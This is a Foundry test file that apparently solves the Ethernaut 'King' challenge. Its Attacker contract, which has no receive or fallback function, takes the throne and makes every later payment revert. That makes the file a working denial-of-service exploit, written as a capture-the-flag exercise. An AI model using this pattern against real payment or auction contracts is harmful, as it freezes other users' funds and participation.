// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test , console} from "forge-std/Test.sol";

import {King} from "../src/King.sol";

contract KingTest is Test {

    King kin;

    Attacker attacker;


    function setUp() public {

     hoax(address(uint160(1)), 1 ether); 
     kin = new King{value : 0.1 ether}();


    attacker = new Attacker(kin);

    vm.deal(address(attacker),1 ether);
        


    }


    function testNoOneCanbeKing() public {


        vm.prank(address(attacker));
        attacker.attack();          // Now we are the owner

        vm.expectRevert();
        hoax(address(uint160(3)), 1 ether);  // it will revert
        
        (bool secc,) = address(kin).call{value : 1 ether }("");


    }
    
}

contract  Attacker {

     King kin;

    constructor( King _kin) {
       
        kin = _kin;

    }

    function attack() public {

        (bool secc,) = address(kin).call{value :kin.prize() }("");

    }

    /**
    
    Note we don't have a receive/fallback function to receive eth  , so transfer will revert

     */

}